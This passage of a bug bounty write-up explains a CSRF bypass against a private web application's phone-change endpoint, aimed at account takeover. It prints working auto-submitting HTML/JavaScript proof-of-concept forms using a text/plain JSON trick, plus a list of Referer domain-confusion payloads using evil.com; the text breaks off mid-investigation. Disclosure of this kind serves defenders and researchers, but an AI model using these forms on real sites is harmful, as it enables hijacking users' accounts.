---
title: CSRF Bypass Using Domain Confusion Leads To ATO
url: https://infosecwriteups.com/csrf-bypass-using-domain-confusion-leads-to-ato-ac682dd17722?source=rss----7b722bfd1b8d--bug_bounty
source: Bug Bounty in InfoSec Write-ups on Medium
date: 2024-09-02
fetch_date: 2025-10-06T18:25:11.558464
---

# CSRF Bypass Using Domain Confusion Leads To ATO

[Sitemap](/sitemap/sitemap.xml)

[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2Fac682dd17722&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderCollection&%7Estage=mobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fcsrf-bypass-using-domain-confusion-leads-to-ato-ac682dd17722&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fcsrf-bypass-using-domain-confusion-leads-to-ato-ac682dd17722&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)

[## InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---publication_nav-7b722bfd1b8d-ac682dd17722---------------------------------------)

·

Follow publication

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:76:76/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_sidebar-7b722bfd1b8d-ac682dd17722---------------------------------------)

A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: <https://weekly.infosecwriteups.com/>

Follow publication

# CSRF Bypass Using Domain Confusion Leads To ATO

[![Osama Aly](https://miro.medium.com/v2/resize:fill:64:64/1*Ip70HelCT_bhPL_zIRbWtA.png)](https://medium.com/%40osamaaly?source=post_page---byline--ac682dd17722---------------------------------------)

[Osama Aly](https://medium.com/%40osamaaly?source=post_page---byline--ac682dd17722---------------------------------------)

6 min read

·

Aug 27, 2024

--

11

Listen

Share

Hello everyone, it’s Osama (W4lT3R) again! I wanted to share a recent finding with you where I successfully bypassed the CSRF protection mechanism in a bug bounty program, collaborating With

[Ahmed Elmalky](https://medium.com/u/7cc0a21a576f?source=post_page---user_mention--ac682dd17722---------------------------------------)

.

Since It was a private program i will refer to it with example.com

It’s been a while since I wanted to find an Account Takeover (ATO) vulnerability in a bug bounty program. So, I began by exploring `account.example.com` from the program's scope.

The first thing I did was register a new account and log in to the main application. Then, as usual, I started by clicking every button I could find while logging the traffic with Burp Suite.

## **Analyzing the Requests**

After looking at the http history we will find the following:
1. All the requests are calling a `.json` endpoint, e.g., `account.example.com/login.json`

2. Requests are sent in the json format

3. There is no CSRF Header in any request

At that point, I thought the application wouldn’t be vulnerable to CSRF because the requests were sent in JSON format, and you wouldn’t be able to set the `Content-Type` header due to the [*Same-Origin-Policy*](https://portswigger.net/web-security/cors/same-origin-policy),So, I started looking for other exploits in the application. Thirty minutes later, I decided to try exploiting this CSRF vulnerability.

## Exploitation Preparation

The only way we could exploit this is if the server wasn’t checking the `Content-Type` header and enforcing it to be `"application/json"`. So, let's check if the application is verifying the header or not...

We will test the Change Phone Number function, as we could achieve an ATO if we are able to change the victim’s phone number.

Press enter or click to view image in full size

![]()

wooob wooob

OKAY! The phone number changed successfully. One last check, and we’re ready to go…

One more check… Does the application require a specific pattern in its JSON body, or can we add some useless parameters and still have it work?

We Can Check this by adding a random parameter with random value e.g., `"a":"test"`

Press enter or click to view image in full size

![]()

Let’s Go now we can craft Our Exploitation

## Exploitation

Let’s Create a simple proof of concept (POC). We will set `enctype="text/plain"` and include the JSON body in a hidden input. Why did we need the extra parameter in our exploit? Because if you try to send the request like this...

```
<html>
  <head><meta name="referrer" content="unsafe-url"></head>
  <body>
  <script>history.pushState('', '', '/')</script>
  <form name="hacker" method="POST" action="https://account.example.com/phone.json" enctype="text/plain">
    <input type="hidden"
    name= '{"_formName":"change-phone","phone":"01111111118"}'>
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

This will result in the following JSON body:

![]()

This is not a valid JSON format because, when submitting a form, every input is expected to have both a name and a value, formatted as `name=value`. To address this, we will set the `name` attribute to our intended body, add a random parameter to take the next `=` symbol as its value, and then set the `value` attribute to `}`.

```
<input type="hidden" name= '{"phone":"01111111118","a":"' value='"}'>
```

This will result in our correctly formatted JSON body:

![]()

So Our Exploitation so far is:

```
<html>
  <head><meta name="referrer" content="unsafe-url"></head>
  <body>
  <script>history.pushState('', '', '/')</script>
  <form name="hacker" method="POST" action="https://account.example.com/phone.json" enctype="text/plain">
    <input type="hidden"
    name= '{"phone":"01111111118","a":"' value='"}'>
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

Since the whole application was working the same way, it became vulnerable to CSRF!

Let’s Get Our Bounty NOW

Well what about give it a try first?

Press enter or click to view image in full size

![]()

??

## Further Investigation

So what is happening? Our request body looks good, and all these things are fine. Then why didn’t it work?

Let’s compare our two requests, the one sent by our exploitation and the one sent with Repeater from Burp Suite.

Since it was the same body, it’s not a problem for us. The cookie is sent successfully, so it’s not about the SameSite flag. Let’s check our headers one by one:

* The `Origin`? Nope.
* `Content-Type`? Nope.
* `Referrer`? Yes…

It needs to have the application domain to work properly. Thankfully, it’s the `Referrer` header, so we still have hope.

If we can manipulate it to make it accept our own server, we can host the exploit on it, set the header using the `history.pushState` function in JavaScript, and still exploit the bug.

So what we need here is domain confusion — to make the server think it’s their own domain when it is not.

Our Tests

* evilaccount.example.com → Fail
* evil.com/account.example.com → Fail
* account.exampleevil.com → Fail
* account.exampleevil.com → Fail
* account.example.com@evil.com → Fail
* evil.com#account.example.com → Fail

the application doesn’t validate the occurrence of domain in the header,

but if we tried something like `test@example.com` it will work and this is normal

Press enter or click to view image in full size

![]()

Url Contents

So the domain is valid. But what if it is only check...